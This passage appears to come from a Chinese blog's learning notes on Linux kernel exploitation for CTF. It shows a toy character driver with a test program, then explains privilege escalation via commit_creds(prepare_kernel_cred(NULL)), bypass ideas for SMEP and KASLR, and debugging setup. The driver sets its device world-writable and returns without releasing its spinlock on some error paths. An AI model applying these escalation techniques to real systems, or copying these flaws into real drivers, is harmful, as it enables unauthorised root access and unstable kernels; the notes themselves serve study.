DEVICE_NAME &quot;peiwithhao&quot;#define DEVICE_PATH &quot;/dev/peiwithhao&quot;#define CLASS_NAME &quot;p_wmodule&quot;#define NOT_INIT 0xffffffff#define READ_ONLY 0x1000#define ALLOW_WRITE 0x1001#define BUFFER_RESET 0x1002static int major_num;static int p_w_module_mode = READ_ONLY;static struct class * module_class = NULL;static struct device * module_device = NULL;static void * buffer = NULL;static spinlock_t spin;static struct file * __file = NULL;struct inode * __inode = NULL;static int __init kernel_module_init(void);static void __exit kernel_module_exit(void);static int p_w_module_open(struct inode *,struct file *);static ssize_t p_w_module_read(struct file *,char __user *,size_t,loff_t *);static ssize_t p_w_module_write(struct file*,const char __user * ,size_t,loff_t *);static int p_w_module_release(struct inode *, struct file *);static long p_w_module_ioctl(struct file *,unsigned int,unsigned long);static long __internal_p_w_module_ioctl(struct file * __file,unsigned int cmd,unsigned long param);static struct file_operations PW_module_fo = &#123;                                                        //descripe the device        .owner = THIS_MODULE,        .unlocked_ioctl = p_w_module_ioctl,        .open = p_w_module_open,        .read = p_w_module_read,        .write = p_w_module_write,        .release = p_w_module_release,&#125;;</code></pre><p>再者之后就是p_wmodule.c了</p><pre><code class="hljs">#include&lt;linux/module.h&gt;                //it have to exist#include&lt;linux/kernel.h&gt;                //loading the information of kernel#include&lt;linux/init.h&gt;                        //contain some useful define#include&lt;linux/fs.h&gt;                        #include&lt;linux/device.h&gt;#include&lt;linux/slab.h&gt;#include &quot;p_wmodule.h&quot;module_init(kernel_module_init);                //inmodule_exit(kernel_module_exit);                //outMODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;dawn&quot;);        static int __init kernel_module_init(void)&#123;        spin_lock_init(&amp;spin);        printk(KERN_INFO &quot;[peiwithhao_TestModule:]Module loaded. Start to register device ...\n&quot;);        major_num = register_chrdev(0,DEVICE_NAME,&amp;PW_module_fo);                        //register the major number        if(major_num &lt;0)&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to register a major number! \n&quot;);                return major_num;        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Register completed ,major number: %d\n&quot;,major_num);                module_class = class_create(THIS_MODULE,CLASS_NAME);                                //create the struct class        if(IS_ERR(module_class))&#123;                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to register class device!\n&quot;);                return PTR_ERR(module_class);        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Class Register complete. \n&quot;);        module_device = device_create(module_class,NULL,MKDEV(major_num,0),NULL,DEVICE_NAME);        //create the device        if(IS_ERR(module_class))&#123;                class_destroy(module_class);                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to create the device! \n&quot;);                return PTR_ERR(module_class);        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module Register complete. \n&quot;);        __file = filp_open(DEVICE_PATH, O_RDONLY,0);                                                //open the file ,now that device        if(IS_ERR(__file))&#123;                device_destroy(module_class,MKDEV(major_num,0));                class_destroy(module_class);                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Unable to change module privilege! \n&quot;);                return PTR_ERR(__file);        &#125;        __inode = file_inode(__file);                __inode-&gt;i_mode |= 0666;                                        filp_close(__file,NULL);        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module privilege change complete.... \n&quot;);        return 0;&#125;static void __exit kernel_module_exit(void)&#123;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Start to clean up the module... \n&quot;);        device_destroy(module_class,MKDEV(major_num,0));        class_destroy(module_class);        unregister_chrdev(major_num,DEVICE_NAME);        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module clean up complete. See you next time! \n&quot;);&#125;static long p_w_module_ioctl(struct file * __file, unsigned  int cmd , unsigned long param)&#123;        long ret;        spin_lock(&amp;spin);        ret = __internal_p_w_module_ioctl(__file , cmd, param);        spin_unlock(&amp;spin);        return ret;&#125;static long __internal_p_w_module_ioctl(struct file *__file,unsigned int cmd, unsigned long param)&#123;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Received operation code : %d\n&quot;,cmd);        switch(cmd)&#123;                case READ_ONLY:                        if(!buffer)&#123;                                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Please reset the buffer at first!\n&quot;);                                return -1;                        &#125;                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module operation mode reset to READ_ONLY...\n&quot;);                        p_w_module_mode = READ_ONLY;                        break;                case ALLOW_WRITE:                        if(!buffer)&#123;                                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Please reset the buffer at first!\n&quot;);                                return -1;                        &#125;                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module operation mode reset to ALLOW_WRITE..\n&quot;);                        p_w_module_mode = ALLOW_WRITE;                        break;                case BUFFER_RESET:                        if(!buffer)&#123;                                buffer = kmalloc(0x500,GFP_ATOMIC);                                if(buffer == NULL)&#123;                                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Unable to initialize the buffer. Kernel malloc error!\n&quot;);                                        p_w_module_mode = NOT_INIT;                                        return -1;                                &#125;                        &#125;                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Buffer reset . Module operation mode reset to READ_ONLY...\n&quot;);                        memset(buffer,0,0x500);                        p_w_module_mode = READ_ONLY;                        break;                case NOT_INIT:                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module operation mode reset to NOT_INIT...&quot;);                        p_w_module_mode = NOT_INIT;                        kfree(buffer);                        buffer = NULL;                        return 0;                default:                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Invalid operation code\n&quot;);                        return -1;                &#125;        return 0;&#125;static int p_w_module_open(struct inode * __inode, struct file * __file)&#123;        spin_lock(&amp;spin);        if(buffer == NULL)&#123;                buffer = kmalloc(0x500,GFP_ATOMIC);                if(buffer == NULL)&#123;                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Unable to initialize the buffer. Kernel malloc error!\n&quot;);                        p_w_module_mode = NOT_INIT;                        return -1;                &#125;                memset(buffer,0,0x500);                p_w_module_mode = READ_ONLY;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Device open,buffer initialized successfully...\n&quot;);        &#125;        else&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Warning: reopen the device may cause unexpected error in kernel!\n&quot;);        &#125;        spin_unlock(&amp;spin);        return 0;&#125;static int p_w_module_release(struct inode * __inode, struct file * __file)&#123;        spin_lock(&amp;spin);        if(buffer)&#123;                kfree(buffer);                buffer = NULL ;        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Device closed\n&quot;);        spin_unlock(&amp;spin);        return 0;&#125;static ssize_t p_w_module_read(struct file * __file ,char __user * user_buf,size_t size,loff_t *__loff)&#123;        const char * const buf = (char*)buffer;        int count;        spin_lock(&amp;spin);        if(p_w_module_mode == NOT_INIT)&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module operation mode reset to NOT_INIT...&quot;);                return -1;        &#125;        count = copy_to_user(user_buf,buf,size &gt; 0x500 ? 0x500 :size);        spin_unlock(&amp;spin);        return count;&#125;static ssize_t p_w_module_write(struct file * __file ,const char __user * user_buf,size_t size,loff_t *__loff)&#123;        const char * const buf = (char*)buffer;        int count;        spin_lock(&amp;spin);        if(p_w_module_mode == NOT_INIT)&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module operation mode reset to NOT_INIT...&quot;);                count =  -1;        &#125;        else if(p_w_module_mode == READ_ONLY)&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Unable to write under the mode READ_ONLY&quot;);                count = -1;        &#125;else                count = copy_from_user(buf,user_buf,size &gt; 0x500?0x500 : size);        spin_unlock(&amp;spin);        return count;&#125;</code></pre><p>这里强烈建议大家跟着码一便，代码不是很长，在写的过程中你就可以懂这里的机制了。<br>这里我讲解一下，当我们注册了这个设备后，由于咱们再file_operations中已经定义了系统调用的函数指针，所以此时也就是调用咱们的实现了，就这么简单，然后这里的ioctl就是设置通信的权限等了。<br>咱们来编译试试看<br><img src="http://imgsrc.baidu.com/super/pic/item/8435e5dde71190ef577c831d8b1b9d16fcfa6068.jpg"><br><img src="http://imgsrc.baidu.com/super/pic/item/c2cec3fdfc039245b233f0cdc294a4c27c1e2569.jpg"></p><h4 id="4-测试一下咱们写的’驱动’"><a href="#4-测试一下咱们写的’驱动’" class="headerlink" title="4.测试一下咱们写的’驱动’"></a>4.测试一下咱们写的’驱动’</h4><p>c代码如下，十分简单</p><pre><code class="hljs">#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;fcntl.h&gt;#include&lt;sys/ioctl.h&gt;char * buf = &quot;test for read and write..&quot;;int main(void)&#123;        char ch[0x100];        int fd = open(&quot;/dev/peiwithhao&quot;,2);        int len = strlen(buf);        ioctl(fd,0x1000,NULL);                        //READ_ONLY        write(fd,buf,len);        ioctl(fd,0x1001,NULL);                        //ALLOW_WRITE        write(fd,buf,len);        read(fd,ch,len);        write(0,ch,len);        ioctl(fd,0x1002,NULL);                        //BUFFER_RESET        read(fd,ch,len);        write(0,ch,len);        close(fd);        return 0;&#125;</code></pre><p>简单链接后执行，<br><img src="http://imgsrc.baidu.com/forum/pic/item/bd315c6034a85edfb973efe10c540923dc547570.jpg"><br>大伙可能初看没什么，但是注意这里咱们并没用使用printf函数，这里的输出是再内核中将我们输入缓冲区的值再输出出来。<br>我们再用dmesg看看<br><img src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb137f9c2dd19854564e93584b7e.jpg"><br>大获全胜！！！！</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>经过一晚上的折腾，对于内核编程有了初步的认知，不会像之前那样摸不着头脑，在这里感谢arttnba3师傅博客的指点。</p><blockquote><p>师傅的隐秘小屋<br><a href="https://arttnba3.cn/">https://arttnba3.cn/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux_Kernel_0x00_Base</title>
    <link href="/2023/06/20/Linux-Kernel-0x00-Base/"/>
    <url>/2023/06/20/Linux-Kernel-0x00-Base/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h1><h2 id="1-linux-kernel-pwn"><a href="#1-linux-kernel-pwn" class="headerlink" title="1. linux kernel pwn"></a>1. linux kernel pwn</h2><p><code>kernel</code> 也是一个程序，用来管理软件发出的数据 <code>I/O</code> 要求，将这些要求转义为指令，交给 <code>CPU</code> 和计算机中的其他组件处理，<code>kernel</code> 是现代操作系统最基本的部分。<br><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/figure/Kernel_Layout.svg"><br>以上便是<code>ctf wiki</code>原话 ，所以大家也不要太过于认为其很难，其实跟咱们用户态就是不同而已，也可能就涉及那么些底层知识罢了（师傅轻喷，我就口嗨一下）。<br>在学习攻击手段之前可以先看看我前面环境准备和简单驱动编写那两篇，可能对您有更大帮助。</p><blockquote><p>Linux kernel环境搭建—0x00<br><a href="https://www.52pojie.cn/thread-1706316-1-1.html">https://www.52pojie.cn/thread-1706316-1-1.html</a><br>(出处: 吾爱破解论坛)<br>Linux kernel环境搭建—0x01<br><a href="https://www.52pojie.cn/thread-1710242-1-1.html">https://www.52pojie.cn/thread-1710242-1-1.html</a><br>(出处: 吾爱破解论坛)</p></blockquote><p>而<code>kernel</code> 最主要的功能有两点：</p><ul><li>控制并与硬件进行交互</li><li>提供 <code>application</code> 能运行的环境<br>包括<code> I/O</code>，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。</li></ul><p>需要注意的是，<code>kernel</code> 的<code> crash</code> 通常会引起重启。（所以咱们这点调试的时候就挺不方便的了，相比于用户态而言），不过这里也可能我刚开始学比较笨而已。</p><h2 id="2-Ring-Model-等级制度森严-狗头-）"><a href="#2-Ring-Model-等级制度森严-狗头-）" class="headerlink" title="2. Ring Model(等级制度森严!(狗头)）"></a>2. Ring Model(等级制度森严!(狗头)）</h2><ol><li>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。</li><li>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</li><li>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。</li></ol><p>注意大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p><h2 id="3-syscall"><a href="#3-syscall" class="headerlink" title="3. syscall"></a>3. syscall</h2><p>也就是系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如<code> scanf</code>，<code>puts</code> 等 <code>IO</code> 相关的函数实际上是对系统调用的封装（<code>read</code> 和 <code>write</code>））。</p><h2 id="4-状态转换（大的要来力！）"><a href="#4-状态转换（大的要来力！）" class="headerlink" title="4. 状态转换（大的要来力！）"></a>4. 状态转换（大的要来力！）</h2><p><code>user space to kernel space</code><br>当发生 系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li><p>通过<code>swapgs</code>切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</p></li><li><p>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp&#x2F;esp。（这里我在调试的时候发现没整rbp，我最开始就发现这里怎么只保存了rsp，这个问题暂时还不是很了解）</p></li><li><p>通过 push 保存各寄存器值，具体的代码如下:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk"> ENTRY(entry_SYSCALL_64)<br> <span class="hljs-regexp">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br> SWAPGS_UNSAFE_STACK<br> <span class="hljs-regexp">/* 保存栈值，并设置内核栈 */</span><br> movq %rsp, PER_CPU_VAR(rsp_scratch)<br> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp<br><span class="hljs-regexp">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="hljs-regexp">/* Construct struct pt_regs on stack */</span><br>pushq  $ __USER_DS      <span class="hljs-regexp">/* pt_regs-&gt;ss */</span><br>pushq  PER_CPU_VAR(rsp_scratch)  <span class="hljs-regexp">/* pt_regs-&gt;sp */</span><br>pushq  %r11             <span class="hljs-regexp">/* pt_regs-&gt;flags */</span><br>pushq  <span class="hljs-variable">$__USER_CS</span>      <span class="hljs-regexp">/* pt_regs-&gt;cs */</span><br>pushq  %rcx             <span class="hljs-regexp">/* pt_regs-&gt;ip */</span><br>pushq  %rax             <span class="hljs-regexp">/* pt_regs-&gt;orig_ax */</span><br>pushq  %rdi             <span class="hljs-regexp">/* pt_regs-&gt;di */</span><br>pushq  %rsi             <span class="hljs-regexp">/* pt_regs-&gt;si */</span><br>pushq  %rdx             <span class="hljs-regexp">/* pt_regs-&gt;dx */</span><br>pushq  %rcx tuichu    <span class="hljs-regexp">/* pt_regs-&gt;cx */</span><br>pushq  $-ENOSYS        <span class="hljs-regexp">/* pt_regs-&gt;ax */</span><br>pushq  %r8              <span class="hljs-regexp">/* pt_regs-&gt;r8 */</span><br>pushq  %r9              <span class="hljs-regexp">/* pt_regs-&gt;r9 */</span><br>pushq  %r10             <span class="hljs-regexp">/* pt_regs-&gt;r10 */</span><br>pushq  %r11             <span class="hljs-regexp">/* pt_regs-&gt;r11 */</span><br>sub $(<span class="hljs-number">6</span>*<span class="hljs-number">8</span>), %rsp      <span class="hljs-regexp">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></code></pre></td></tr></table></figure></li><li><p>通过汇编指令判断是否为 x32_abi。</p></li><li><p>通过系统调用号，跳到全局变量 sys_call_table 相应位置继续执行系统调用。<br>这里再给出保存栈的结构示意图，这里我就引用下别的师傅的图了。注意这是保存在内核栈中<br><img src="https://img-blog.csdnimg.cn/20201105102427468.png"></p></li></ol><h2 id="5-kernel-space-to-user-space"><a href="#5-kernel-space-to-user-space" class="headerlink" title="5. kernel space to user space"></a>5. kernel space to user space</h2><p>退出时，流程如下：</p><ol><li>通过 swapgs 恢复 GS 值</li><li>通过 sysretq 或者 iretq 恢复到用户控件继续执行。如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags&#x2F;rflags, esp&#x2F;rsp 等）</li></ol><h2 id="6-struct-cred"><a href="#6-struct-cred" class="headerlink" title="6. struct cred"></a>6. struct cred</h2><p>咱们要管理进程的权限，那么内核必定会维护一些数据结构来保存，他是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。<br>下面就是cred的数据结构源码</p><pre><code class="hljs">struct cred &#123;    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC  0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif    kuid_t      uid;        /* real UID of the task */    kgid_t      gid;        /* real GID of the task */    kuid_t      suid;       /* saved UID of the task */    kgid_t      sgid;       /* saved GID of the task */    kuid_t      euid;       /* effective UID of the task */    kgid_t      egid;       /* effective GID of the task */    kuid_t      fsuid;      /* UID for VFS ops */    kgid_t      fsgid;      /* GID for VFS ops */    unsigned    securebits; /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;  /* caps we&#39;re permitted */    kernel_cap_t    cap_effective;  /* caps we can actually use */    kernel_cap_t    cap_bset;   /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char   jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key  *process_keyring; /* keyring private to this process */    struct key  *thread_keyring; /* keyring private to this thread */    struct key  *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;  /* subjective LSM security */#endif    struct user_struct *user;   /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;  /* supplementary groups for euid/fsgid */    struct rcu_head rcu;        /* RCU deletion hook */&#125; __randomize_layout;</code></pre><p>基础知识介绍完毕，咱们开始介绍咱们内核pwn的最主要的目的</p><h1 id="0x01-目的"><a href="#0x01-目的" class="headerlink" title="0x01 目的"></a>0x01 目的</h1><p>借用arttnba3师傅的原话：“毫无疑问，对于内核漏洞进行利用，并最终提权到 root，在黑客界是一种最为 old school 的美学（（“我这里打两个括号以示尊敬（。<br>咱们在内核pwn中，最重要以及最广泛的那就是提权了，其他诸如dos攻击等也行，但是主要是把人家服务器搞崩之类的，并没有提权来的高效。</p><h2 id="1-提权-Elevation-of-authority"><a href="#1-提权-Elevation-of-authority" class="headerlink" title="1. 提权(Elevation of authority)"></a>1. 提权(Elevation of authority)</h2><p>所谓提权，直译也即提升权限，是在咱们已经在得到一个shell之后，咱们进行深入攻击的操作，那么请问如何得到一个shell呢，那就请大伙好好学习用户模式下的pwn吧（<br>而与提权息息相关的那不外乎两个函数，不过咱们先不揭晓他们，咱们先介绍一个结构体：<br>在内核中使用结构体 <code>task_struct</code> 表示一个进程，该结构体定义于内核源码<code>include/linux/sched.h</code>中，代码比较长就不在这里贴出了<br>一个进程描述符的结构应当如下图所示：</p><img src="/2023/06/20/Linux-Kernel-0x00-Base/evolution.png" class="" title="说明"><p>注意到task_struct的源码中有如下代码：</p><pre><code class="hljs">/* Process credentials: *//* Tracer&#39;s credentials at attach: */const struct cred __rcu        *ptracer_cred;/* Objective and real subjective task credentials (COW): */const struct cred __rcu        *real_cred;/* Effective (overridable) subjective task credentials (COW): */const struct cred __rcu        *cred;</code></pre><p>看到熟悉的字眼没，对，那就是cred结构体指针<br>前面我们讲到，一个进程的权限是由位于内核空间的cred结构体进行管理的，那么我们不难想到：只要改变一个进程的cred结构体，就能改变其执行权限<br>在内核空间有如下两个函数，都位于kernel&#x2F;cred.c中：</p><ul><li><p><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是daemon参数应为有效的进程描述符地址或NULL,如果传入NULL,则会返回一个root权限的cred</p></li><li><p><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的cred结构体应用到进程.<br>所以我们最重要的目的是类似于用户态下调用system(“&#x2F;bin&#x2F;sh”)一样,咱们内核态就需要调用commit_creds(prepare_kernel_cred(NULL))即可达成提权功能!</p></li></ul><p>这里我们也可以看到prepare_kernel_cred()函数源码：</p><pre><code class="hljs">struct cred *prepare_kernel_cred(struct task_struct *daemon)&#123;    const struct cred *old;    struct cred *new;    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);    if (!new)        return NULL;    kdebug(&quot;prepare_kernel_cred() alloc %p&quot;, new);    if (daemon)        old = get_task_cred(daemon);    else        old = get_cred(&amp;init_cred);</code></pre><h1 id="0x02-保护措施"><a href="#0x02-保护措施" class="headerlink" title="0x02 保护措施"></a>0x02 保护措施</h1><h2 id="1-KASLR-内核地址空间布局随机化"><a href="#1-KASLR-内核地址空间布局随机化" class="headerlink" title="1. KASLR(内核地址空间布局随机化)"></a>1. KASLR(内核地址空间布局随机化)</h2><p>与用户态ASLR类似，在开启了 KASLR 的内核中，内核的代码段基地址等地址会整体偏移。其在内核堆的偏移粒度为256MB。</p><h2 id="2-FGKASLR-细粒度地址空间布局随机化"><a href="#2-FGKASLR-细粒度地址空间布局随机化" class="headerlink" title="2. FGKASLR(细粒度地址空间布局随机化)"></a>2. FGKASLR(细粒度地址空间布局随机化)</h2><p>KASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，因此有研究者基于 KASLR 实现了 FGKASLR，以函数粒度重新排布内核代码</p><h2 id="3-STACK-PROTECTOR-内核中的“金丝雀”"><a href="#3-STACK-PROTECTOR-内核中的“金丝雀”" class="headerlink" title="3. STACK PROTECTOR(内核中的“金丝雀”)"></a>3. STACK PROTECTOR(内核中的“金丝雀”)</h2><p>类似于用户态程序的 canary，通常又被称作是 stack cookie，用以检测是否发生内核堆栈溢出，若是发生内核堆栈溢出则会产生 kernel panic<br>内核中的 canary 的值通常取自 gs 段寄存器某个固定偏移处的值</p><h2 id="4-SMAP-x2F-SMEP-内核-访问-x2F-执行-保护"><a href="#4-SMAP-x2F-SMEP-内核-访问-x2F-执行-保护" class="headerlink" title="4. SMAP&#x2F;SMEP(内核 访问&#x2F;执行 保护)"></a>4. SMAP&#x2F;SMEP(内核 访问&#x2F;执行 保护)</h2><p>SMAP即管理模式访问保护（Supervisor Mode Access Prevention），SMEP即管理模式执行保护（Supervisor Mode Execution Prevention），这两种保护通常是同时开启的，用以阻止内核空间直接访问&#x2F;执行用户空间的数据，完全地将内核空间与用户空间相分隔开，用以防范ret2usr（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击</p><p>SMEP保护的绕过有以下两种方式：</p><ul><li>利用内核线性映射区对物理地址空间的完整映射，找到用户空间对应页框的内核空间地址，利用该内核地址完成对用户空间的访问（即一个内核空间地址与一个用户空间地址映射到了同一个页框上），这种攻击手法称为 ret2dir</li><li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP改变CR4寄存器的值便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行 ret2usr，但对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式</li></ul><h2 id="5-KPTI-Kernel-PageTable-Isolation，内核页表隔离"><a href="#5-KPTI-Kernel-PageTable-Isolation，内核页表隔离" class="headerlink" title="5. KPTI(Kernel PageTable Isolation，内核页表隔离)"></a>5. KPTI(Kernel PageTable Isolation，内核页表隔离)</h2><p>该举措使得内核态空间的内存和用户态空间的内存的隔离进一步得到了增强。</p><ul><li>内核态中的页表包括用户空间内存的页表和内核空间内存的页表。</li><li>用户态的页表只包括用户空间内存的页表以及必要的内核空间内存的页表，如用于处理系统调用、中断等信息的内存。</li></ul><p>我们可以在虚拟机中使用下面命令来查看是否开启kpti</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /sys/devices/system/cpu/vulnerabilities/*<br></code></pre></td></tr></table></figure><h1 id="0x03-环境说明"><a href="#0x03-环境说明" class="headerlink" title="0x03 环境说明"></a>0x03 环境说明</h1><p>首先咱们拿到个ctf题目之后，咱们一般是先解包，会发现有这些个文件</p><ol><li><code>baby.ko</code>:包含漏洞的驱动模块，一般使用ida打开分析,可以根据init文件的路径去rootfs.cpio里面找</li><li><code>bzImage</code>:打包的内核代码，一般通过它抽取出vmlinx,寻找gadget也是在这里。可以采用的方式其一是<code>extract-vmlinux</code>,另一种是使用<code>vmlinux-to-elf</code></li><li><code>initramfs.cpio</code>:内核采用的文件系统,解压一般可以采用一下方式：<code>cpio -idmv &lt; ../rootfs.cpio</code>，注意这里如果显示cpio文件类型为gz，我们需要先使用<code>gzip -d file.cpio</code>来解压缩，然后重新压缩可以采用:<code>find . | cpio -o --format=newc &gt; ../rootfs.cpio</code></li><li><code>startvm.sh</code>:启动QEMU的脚本</li><li><code>vmlinux</code>:静态编译，未压缩的内核文件，可以在里面找ROP</li><li><code>init文件</code>:在rootfs.cpio文件解压可以看到，记录了系统初始化时的操作，一般在文件里insmod一个内核模块.ko文件，通常是有漏洞的文件</li><li><code>.ko文件</code>:需要拖到IDA里面分析找漏洞的文件，也即一般的漏洞出现的文件</li></ol><p>之后咱们可以利用rootfs.cpio解压的文件中看到init脚本，此即为加载文件系统的脚本，在一般为boot.sh或start.sh脚本中也记录了qemu的启动参数</p><h1 id="0x04-gdb调试内核"><a href="#0x04-gdb调试内核" class="headerlink" title="0x04 gdb调试内核"></a>0x04 gdb调试内核</h1><ol><li><p>首先我们通过解压文件系统，将初始化脚本中setsid修改为0，表示使用root权限来开启虚拟机，然后打包文件系统</p></li><li><p>然后我们可以通过在start.sh中添加<code>-gdb tcp::1234</code>或者说<code>-s</code>来开启远程调试端口，启动内核并在里面调用<code>lsmod</code></p></li><li><p>修改当前目录下<code>.gdbinit</code>，这样可以使得我们的gdb附带额外功能，例如在这里我哦们设置<code>set architecture i386:x86-64</code></p></li><li><p>打开gdb，设置以下参数：</p><pre><code class="hljs"> #!/bin/bash gdb -q \   -ex &quot;&quot; \   -ex &quot;file ./vmlinux&quot; \   -ex &quot;add-symbol-file ./extract/core.ko 0xffffffffc0000000&quot; \   -ex &quot;b core_copy_func&quot; \   -ex &quot;target remote localhost:1234&quot; \</code></pre></li></ol><h1 id="0x05-CTF中的一些脚本工具"><a href="#0x05-CTF中的一些脚本工具" class="headerlink" title="0x05 CTF中的一些脚本工具"></a>0x05 CTF中的一些脚本工具</h1><h2 id="1-extract-vmlinux"><a href="#1-extract-vmlinux" class="headerlink" title="1.extract-vmlinux"></a>1.extract-vmlinux</h2><p>首先便是提取<code>vmlinux</code>的脚本文件<code>extract-vmlinux</code>,如下：</p><pre><code class="hljs">#!/bin/sh# SPDX-License-Identifier: GPL-2.0-only# ----------------------------------------------------------------------# extract-vmlinux - Extract uncompressed vmlinux from a kernel image## Inspired from extract-ikconfig# (c) 2009,2010 Dick Streefland &lt;mailto:dick@streefland.net&gt;## (c) 2011      Corentin Chary &lt;mailto:corentin.chary@gmail.com&gt;## ----------------------------------------------------------------------check_vmlinux()&#123;    # Use readelf to check if it&#39;s a valid ELF    # TODO: find a better to way to check that it&#39;s really vmlinux    #       and not just an elf    readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1    cat $1    exit 0&#125;try_decompress()&#123;    # The obscure use of the &quot;tr&quot; filter is to work around older versions of    # &quot;grep&quot; that report the byte offset of the line instead of the pattern.    # Try to find the header ($1) and decompress from here    for pos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`    do        pos=$&#123;pos%%:*&#125;        tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null        check_vmlinux $tmp    done&#125;# Check invocation:me=$&#123;0##*/&#125;img=$1if  [ $# -ne 1 -o ! -s &quot;$img&quot; ]then    echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2    exit 2fi# Prepare temp files:tmp=$(mktemp /tmp/vmlinux-XXX)trap &quot;rm -f 